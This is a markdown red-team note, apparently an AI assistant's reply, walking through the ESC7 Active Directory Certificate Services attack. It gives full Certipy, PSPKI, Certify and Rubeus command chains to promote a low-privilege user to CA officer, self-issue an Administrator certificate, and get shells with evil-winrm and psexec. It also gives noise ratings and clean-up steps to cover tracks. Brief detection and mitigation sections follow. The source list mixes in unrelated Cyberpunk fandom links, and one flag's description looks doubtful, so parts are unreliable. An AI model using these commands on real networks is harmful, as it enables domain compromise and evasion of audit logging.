---
title: "ESC7 — Vulnerable CA Access Control (ManageCA ManageCertificates)"
description: "ESC7 is a CA-level access control attack. Where ESC4 abused write permissions on a template object, ESC7 abuses dangerous permissions on the Certificate…"
category: active-directory
tags: ["active-directory", "adcs"]
tools: ["Rubeus", "Certipy", "BloodHound", "Metasploit", "Evil-WinRM"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/ACL-ESC-Techniques/ESC7 — Vulnerable CA Access Control (ManageCA  ManageCertificates).md"
---
# ESC7 — Vulnerable CA Access Control (ManageCA / ManageCertificates)

## Quick Reference

| Field | Value |
|-------|-------|
| **Category** | CA-Level Permission Abuse |
| **Difficulty** | Medium–High |
| **Pre-requisites** | ManageCA or ManageCertificates rights on CA object |
| **Tools** | Certipy, Certify.exe, PSPKI |
| **OPSEC Noise** | High — officer promotion, template enabling, request approval |
| **One-liner** | Use ManageCA/ManageCertificates rights to add yourself as an officer, enable the SubCA template, then approve your own pending certificate request. |

***

## What Is ESC7?

ESC7 is a **CA-level access control attack**. Where ESC4 abused write permissions on a *template object*, ESC7 abuses dangerous permissions on the **Certificate Authority itself**. Two specific rights are exploited:

- **`ManageCA`** — Administrative control over the CA. Lets you change CA-wide settings, enable templates, modify policy flags (like `EDITF_ATTRIBUTESUBJECTALTNAME2` from ESC6), and add new CA officers
- **`ManageCertificates`** — Lets you approve, deny, and issue **pending certificate requests** — effectively bypassing manager approval on any template

ESC7 typically manifests in **two distinct attack paths** depending on which permission you hold:

| Path | Permission Held | Method |
|------|----------------|---------|
| **Path A** | `ManageCA` only | Use it to grant yourself `ManageCertificates`, then follow Path B |
| **Path B** | Both `ManageCA` + `ManageCertificates` | Enable `SubCA` template → Request cert (gets denied) → Issue it yourself → Authenticate |

> 💡 In practice, having `ManageCA` is almost always enough — you use it to elevate yourself to `ManageCertificates`, making Path A just a one-step bootstrap into Path B.

***

## Required Conditions

| Condition | Where to Check |
|-----------|----------------|
| Low-priv principal holds `ManageCA` or `ManageCertificates` on the CA | CA output: `ManageCa` or `ManageCertificates` Access Rights |
| `SubCA` template exists (built-in, almost always present) | Template enumeration output |
| `Request Disposition: Issue` OR ability to approve pending requests | CA configuration |

***

## Step 0 — Enumeration

```bash
# Standard scan
certipy-ad find -u 'lowpriv@domain.htb' -p 'Password123!' \
  -dc-ip $TARGET -vulnerable -stdout

# With hash
certipy-ad find -u 'lowpriv@domain.htb' -hashes :NTHASH \
  -dc-ip $TARGET -vulnerable -stdout
```

### What Vulnerable ESC7 Output Looks Like

The vulnerability appears at the **CA level**, not template level:

```
Certificate Authorities
  0
    CA Name                             : DOMAIN-CA
    DNS Name                            : DC01.domain.htb
    Permissions
      Owner                             : DOMAIN\Administrators
      Access Rights
        ManageCa          : DOMAIN\Domain Admins
                            DOMAIN\Enterprise Admins
                            DOMAIN\lowpriv           ← ⚠️ DANGEROUS
        ManageCertificates: DOMAIN\Domain Admins
                            DOMAIN\Enterprise Admins
                            DOMAIN\lowpriv           ← ⚠️ DANGEROUS
        Enroll            : DOMAIN\Authenticated Users

    [!] Vulnerabilities
      ESC7 : 'DOMAIN\lowpriv' has dangerous permissions
```

***

## Full Attack Chain — Linux (Certipy) — Path A+B Combined

This is the **most common real-world scenario** — you have `ManageCA` and use it to bootstrap `ManageCertificates`, then exploit.

***

### Step 1 — Add Yourself as a Certificate Officer (ManageCA → ManageCertificates)

```bash
# Grant your account the ManageCertificates right using your ManageCA privilege
certipy-ad ca \
  -u 'lowpriv@domain.htb' \
  -p 'Password123!' \
  -dc-ip $TARGET \
  -ca 'DOMAIN-CA-NAME' \
  -add-officer lowpriv

# With hash
certipy-ad ca \
  -u 'lowpriv@domain.htb' \
  -hashes :NTHASH \
  -dc-ip $TARGET \
  -ca 'DOMAIN-CA-NAME' \
  -add-officer lowpriv
```

**Expected output:**
```
[*] Successfully added officer 'lowpriv' on 'DOMAIN-CA-NAME'
```

***

### Step 2 — Enable the SubCA Template

The `SubCA` template is a built-in template that has `ENROLLEE_SUPPLIES_SUBJECT` and no EKU restrictions — it is essentially a blank-cheque certificate template. It is disabled by default but can be enabled with `ManageCA`:

```bash
certipy-ad ca \
  -u 'lowpriv@domain.htb' \
  -p 'Password123!' \
  -dc-ip $TARGET \
  -ca 'DOMAIN-CA-NAME' \
  -enable-template SubCA
```

**Expected output:**
```
[*] Successfully enabled 'SubCA' on 'DOMAIN-CA-NAME'
```

> ⚠️ The `SubCA` template is admin-enroll only by default. When you enable it with your `ManageCA` right, you still technically can't enroll in it as a low-priv user — **but the next steps work around this deliberately**.

***

### Step 3 — Request a Certificate (Expect a Denial)

You deliberately request a cert from `SubCA` as `Administrator`. The CA will reject it because you're low-priv. This is **intentional** — the rejection creates a pending request ID you can use in the next step:

```bash
certipy-ad req \
  -u 'lowpriv@domain.htb' \
  -p 'Password123!' \
  -dc-ip $TARGET \
  -ca 'DOMAIN-CA-NAME' \
  -template SubCA \
  -upn 'administrator@domain.htb'
```

**Expected output:**
```
[*] Requesting certificate via RPC
[-] Got error: The RPCSS is unavailable. / Access Denied
[*] Request ID is 37        ← NOTE THIS NUMBER — you need it
[-] Would-be issued certificate will be stored in 'administrator.pfx'
```

> 💡 The request **will fail with Access Denied** — this is expected and correct. What matters is the **Request ID** printed in the output. Note it down.

***

### Step 4 — Issue the Denied Request Yourself

Now use your newly acquired `ManageCertificates` / officer rights to **approve and issue** your own denied request:

```bash
certipy-ad ca \
  -u 'lowpriv@domain.htb' \
  -p 'Password123!' \
  -dc-ip $TARGET \
  -ca 'DOMAIN-CA-NAME' \
  -issue-request 37          # ← Use the Request ID from Step 3
```

**Expected output:**
```
[*] Successfully issued certificate
```

***

### Step 5 — Retrieve the Issued Certificate

Now pull the approved certificate down:

```bash
certipy-ad req \
  -u 'lowpriv@domain.htb' \
  -p 'Password123!' \
  -dc-ip $TARGET \
  -ca 'DOMAIN-CA-NAME' \
  -retrieve 37               # ← Same Request ID

# Output: administrator.pfx
```

**Expected output:**
```
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@domain.htb'
[*] Certificate has no object SID
[*] Saving certificate and private key to 'administrator.pfx'
```

***

### Step 6 — Authenticate

```bash
certipy-ad auth \
  -pfx administrator.pfx \
  -username administrator \
  -domain domain.htb \
  -dc-ip $TARGET

# Output: administrator.ccache + NT hash
```

***

### Step 7 — Shell

```bash
# Kerberos TGT
export KRB5CCNAME=administrator.ccache
wmiexec.py -k -no-pass DC01.domain.htb
evil-winrm -i DC01.domain.htb -r domain.htb

# Pass-the-Hash
evil-winrm -i $TARGET -u administrator -H <NTHASH>
psexec.py administrator@$TARGET -hashes :NTHASH
```

***

## Full Attack Chain — Windows (PSPKI + Certify.exe + Rubeus)

```powershell
# ── Step 1: Install PSPKI module if not present ──────────────────────────────
Install-Module -Name PSPKI

# ── Step 2: Enable SubCA Template using ManageCA right ───────────────────────
Import-Module PSPKI
Get-CertificationAuthority -ComputerName DC01.domain.local | `
  Get-CATemplate | `
  Add-CATemplate -DisplayName "SubCA" | `
  Set-CATemplate

# ── Step 3: Request cert (will be denied — note the Request ID) ──────────────
.\Certify.exe request /ca:DC01.domain.local\DOMAIN-CA /template:SubCA /altname:administrator
# Note: This will fail — grab the Request ID from the output

# ── Step 4: Issue the denied request ─────────────────────────────────────────
# Using PSPKI to approve the pending request
$CA = Get-CertificationAuthority -ComputerName DC01.domain.local
$CA | Get-PendingRequest -RequestID 37 | Approve-CertificateRequest

# ── Step 5: Retrieve the issued cert ─────────────────────────────────────────
.\Certify.exe request /ca:DC01.domain.local\DOMAIN-CA /retrieve:37
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# ── Step 6: Authenticate with Rubeus ─────────────────────────────────────────
.\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /getcredentials /nowrap
.\Rubeus.exe createnetonly /program:powershell.exe /show
.\Rubeus.exe ptt /ticket:<base64ticket>
```

***

## ESC7 Visual Attack Flow

```
[lowpriv has ManageCA on DOMAIN-CA]
              │
              │  certipy ca -add-officer lowpriv
              ▼
[lowpriv now has ManageCertificates]
              │
              │  certipy ca -enable-template SubCA
              ▼
[SubCA template enabled]
              │
              │  certipy req -template SubCA -upn administrator@domain.htb
              ▼
[Request DENIED — but Request ID 37 created]
              │
              │  certipy ca -issue-request 37
              ▼
[Request manually approved by lowpriv as officer]
              │
              │  certipy req -retrieve 37
              ▼
[administrator.pfx retrieved]
              │
              │  certipy auth -pfx administrator.pfx
              ▼
[TGT + NT Hash for Administrator]
```

***

## Alternative ESC7 Path — ManageCA Only (Enable ESC6)

If you only have `ManageCA` and don't want to go through the SubCA route, you can use your `ManageCA` right to **flip the ESC6 flag on the CA** — turning every Client Auth template into an ESC1 vector instantly:

```bash
# Enable EDITF_ATTRIBUTESUBJECTALTNAME2 via ManageCA
certipy-ad ca \
  -u 'lowpriv@domain.htb' \
  -p 'Password123!' \
  -dc-ip $TARGET \
  -ca 'DOMAIN-CA-NAME' \
  -enable-telemetry   # ← Certipy flag to enable SAN on CA

# Then exploit exactly like ESC6 — request from any Client Auth template
certipy-ad req \
  -u 'lowpriv@domain.htb' \
  -p 'Password123!' \
  -dc-ip $TARGET \
  -ca 'DOMAIN-CA-NAME' \
  -template 'User' \
  -upn 'administrator@domain.htb'
```

> 💡 This is what Tarlogic documented in their real Red Team engagement — they used `ManageCA` to enable the SAN flag CA-wide, then used the `User` template exactly like an ESC6 attack. ESC7 and ESC6 are deeply linked — **ESC7 is often the path that enables ESC6**.

***

## ESC6 vs ESC7 — The Relationship

| | ESC6 | ESC7 |
|---|---|---|
| **Root cause** | `EDITF_ATTRIBUTESUBJECTALTNAME2` already set | Low-priv user holds `ManageCA` / `ManageCertificates` |
| **Attack type** | Exploit an existing CA misconfiguration | **Create** a CA misconfiguration (or approve your own requests) |
| **Main tool** | `certipy req -upn` | `certipy ca` subcommand |
| **Templates needed** | Any Client Auth template | `SubCA` (or any template after enabling ESC6 flag) |
| **Post-patch ESC6 issue** | May be blocked | Still works — approval bypass is independent of SAN enforcement |
| **Can combine?** | ✅ | ✅ ESC7 ManageCA → enable ESC6 flag → exploit as ESC6 |

***

## OPSEC Considerations

| Action | Log Generated | Noise Level |
|--------|--------------|-------------|
| CA ACL query | LDAP query | 🟢 Low |
| Add yourself as officer | CA audit log + 5136 | 🔴 High |
| Enable SubCA template | CA configuration change | 🔴 High |
| Submit pending cert request | Event ID 4886 (request) | 🟡 Medium |
| Approve own request | Event ID 4887 + CA manager approval log | 🔴 High |

> ⚠️ ESC7 is the **second noisiest** ADCS attack after ESC4. The officer promotion and request approval generate significant CA audit logs. Always clean up.

***

## Clean-Up Commands

```bash
# Remove yourself as officer (run after completing the attack)
certipy-ad ca \
  -u 'lowpriv@domain.htb' \
  -p 'Password123!' \
  -dc-ip $TARGET \
  -ca 'DOMAIN-CA-NAME' \
  -remove-officer lowpriv

# Disable the SubCA template if you enabled it
certipy-ad ca \
  -u 'lowpriv@domain.htb' \
  -p 'Password123!' \
  -dc-ip $TARGET \
  -ca 'DOMAIN-CA-NAME' \
  -disable-template SubCA
```

***

## PSPKI Module Alternative (Windows)

```powershell
# Install PSPKI module
Install-Module -Name PSPKI -Force

# List CA permissions
Get-CertificationAuthority | Get-CertificationAuthorityAcl |
  Format-List Identity, AccessRules

# Submit and approve certificate (if you have ManageCertificates)
$ca = Get-CertificationAuthority -ComputerName CA-SERVER
$req = Submit-CertificateRequest -CA $ca -Path .\request.req
Approve-CertificateRequest -CA $ca -RequestID $req.RequestID
```

***

## Detection Indicators

- **Event ID 4899** — A certificate template was changed (SubCA enabled)
- **Event ID 4890** — The certificate manager settings for Certificate Services changed (officer added)
- **Event ID 4887** — Certificate issued where requester ≠ subject
- **Event ID 4882** — The security permissions for Certificate Services changed — specifically watch for non-admin accounts appearing in `ManageCA` or `ManageCertificates` ACEs
- Alert on **any non-PKI-admin account** appearing in `ManageCA` ACL — this should be a zero-tolerance finding

***

## Mitigation

- **Audit CA DACLs** — `ManageCA` and `ManageCertificates` should only be granted to dedicated PKI admin accounts, never to `Domain Users`, `Authenticated Users`, or service accounts without need
- **Disable `SubCA` template** if it is not in active business use — it serves no purpose in most environments and is a high-risk template
- **Separate PKI admin duties** — The person managing certificates should not be the same account used for day-to-day domain activity
- **Alert on CA configuration changes** — Monitor Event ID 4890 and 4899 continuously; legitimate CA configuration changes are rare and should always be change-controlled

***

Ready for **ESC8** when you say go, Netrunner.

Sources
 ADCS ESC7 - Vulnerable Certificate Authority Access Control https://www.hackingarticles.in/adcs-esc7-vulnerable-certificate-authority-access-control/
 Active Directory Certificate Attack: ESC7 https://www.rbtsec.com/blog/active-directory-certificate-attack-esc7/
 AD CS: weaponizing the ESC7 attack | BlackArrow - Tarlogic https://www.tarlogic.com/blog/ad-cs-esc7-attack/
 redblock_team-11.-ADCS-Attacks.pdf https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/14624338/ba26726a-dc39-49bb-a7f4-de582faee79b/redblock_team-11.-ADCS-Attacks.pdf
 Certipy Deep Dive — Escalating via AD CS with ESC4–ESC7 https://www.youtube.com/watch?v=rEstm6e3Lek
 Common ADCS Vulnerabilities: Logging, Exploitation ... - Lares Labs https://labs.lares.com/adcs-exploits-investigations-pt2/
 Netrunning for Dummies in Night CIty | World Anvil https://www.worldanvil.com/w/night-city-mindlessorca/a/netrunning-for-dummies-article
 How does netrunning work in combat zone? : r/cyberpunkcombatzone https://www.reddit.com/r/cyberpunkcombatzone/comments/1dc9poz/how_does_netrunning_work_in_combat_zone/
 ADCS Attack Paths in BloodHound — Part 2 - Blog - SpecterOps https://posts.specterops.io/adcs-attack-paths-in-bloodhound-part-2-ac7f925d1547
 Programs Explained in Netrunning | Cyberpunk Red in a Nutshell #7 https://www.youtube.com/watch?v=YJKvOr9VEIU
 AD CS ESC1 Certificate Exploitation Guide | PDF - Scribd https://www.scribd.com/document/921992856/ESC1
 ADCS Security: All 16 ESC Attacks Guide - Helpdesk Hero https://help-desk-hero.com/article/adcs-security-complete-guide-detecting-preventing-esc-attacks
 How does netrunning work in cyberpunk? - Facebook https://www.facebook.com/groups/340493143310905/posts/1887224115304459/
 How to Exploit ADCS Certificate Attacks with Certipy and Metasploit https://www.linkedin.com/posts/muskan-sen_adcs-esc3-enrollment-agent-template-activity-7373926392394125312-Y4SZ
 Abusing Active Directory Certificate Services (ADCS) | ESC8 Attack ... https://www.youtube.com/watch?v=pVezmVSCJGk
 Netrunner - Cyberpunk Wiki - Fandom https://cyberpunk.fandom.com/wiki/Netrunner
 AD CS Security: Understanding and Exploiting ESC Techniques https://www.buaq.net/go-365639.html
